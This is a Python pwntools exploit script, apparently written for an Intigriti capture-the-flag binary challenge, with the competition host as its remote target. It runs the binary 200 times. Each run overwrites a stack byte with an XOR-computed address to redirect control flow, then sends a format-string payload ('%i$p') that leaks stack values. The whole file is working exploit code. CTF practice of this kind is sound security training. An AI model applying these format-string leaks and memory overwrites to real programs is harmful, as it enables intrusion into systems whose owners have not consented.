from pwn import *

gs = '''
b *vuln+92
b *vuln+257
b *vuln+313
continue
'''

elf = context.binary = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

lista = list()

for i in range(200):
    io = start()

    # Stack position

    io.recvline()
    io.sendline(str(11).encode())

    # Byte Index

    io.recvline()
    io.recvline()

    # 0 <= index <= 7
    io.sendline(str(0).encode())

    # xor value

    io.recvline()
    io.sendline(str(0x4014fa ^ 0x4014be).encode())

    # Format Strings printf(fmt_string)

    payload = f"AAAAAAAA.%{i}$p@"  #b"A"*20

    io.recvline()
    io.send(payload)

    io.recvline()

    address = io.recvline().replace(b"Thanks for modifying the byte, goodbye.", b"").strip().decode()

    #if "0x40" in address:
    print(f"[+] Para {i}:", address)
    
    #io.interactive()
    io.close()

